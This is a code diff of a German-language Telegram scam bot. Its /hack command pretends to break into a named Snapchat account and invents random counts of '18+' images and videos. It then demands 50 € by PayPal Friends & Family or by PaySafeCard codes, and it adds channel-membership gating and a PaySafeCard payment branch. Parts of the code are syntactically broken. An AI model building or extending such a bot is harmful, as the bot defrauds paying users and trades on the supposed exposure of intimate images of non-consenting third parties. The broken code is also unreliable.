@@ -126,7 +126,22 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("Fehler bei get_chat_member:", e)
         await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
         return
-if not context.args:
+async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    try:
+        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
+        if member.status in ["left", "kicked"]:
+            await update.message.reply_text(
+                "🌟 Bitte abonniere zuerst den Kanal, um den Bot nutzen zu können! 🌟\n\n"
+                "👉 https://t.me/+wf3YFvO0uJM5MGJh"
+            )
+            return
+    except Exception as e:
+        print("Fehler bei get_chat_member:", e)
+        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
+        return
+
+    if not context.args:
         await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
         return
 
@@ -149,19 +164,18 @@ if not context.args:
     await asyncio.sleep(2)
 
     bilder = random.randint(16, 20)
-    videos = random.randint(7, 😍
+    videos = random.randint(7, 8)
 
     msg_text = (
         f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
         f"👤 {name}\n"
-        f"🖼 {bilder} Bilder als 18+ getaggt\n"
+        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
         f"📹 {videos} Videos als 18+ getaggt\n\n"
         f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 50 € mit /pay.\n\n"
-        f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz"
+        f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz\n"
         f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
     )
     await msg.edit_text(msg_text)
-
 # ---- PAY ----
 async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
@@ -179,11 +193,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cmd = query.data
 
     info_refund = (
-        "\n\n⚠️ <b>Wichtig:</b> Sende <u>keine</u> normale Zahlung, sondern wähle "
+        "\n\n⚠ <b>Wichtig:</b> Sende <u>keine</u> normale Zahlung, sondern wähle "
         "<b>„Freunde & Familie“</b> in PayPal aus.\n\n"
         "📌 <b>Verwendungszweck:</b> Gib deinen <u>Telegram-Namen</u> an!"
     )
-
+    elif cmd == "pay_paysafe":
+        text = (
+            "💳 <b>PaySafeCard</b>\n\n"
+            "Bitte sende deinen 16-stelligen Code im Format:\n"
+            "<code>0000-0000-0000-0000</code>\n"
+            f"{info_refund}"
+            "\n\nDer Code wird überprüft und weitergeleitet."
+        )
     if cmd == "pay_paypal":
         text = (
             "💸 <b>PayPal Zahlung (Freunde & Familie)</b>\n\n"
@@ -205,7 +226,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Zurück-Button
-    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
+    keyboard = [[InlineKeyboardButton("⬅ Zurück", callback_data="pay")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
 ---- PHOTO (Beweis) ----
@@ -293,4 +314,4 @@ def main():
 
 if name == "main":
     keep_alive()
-    main()
+    main()
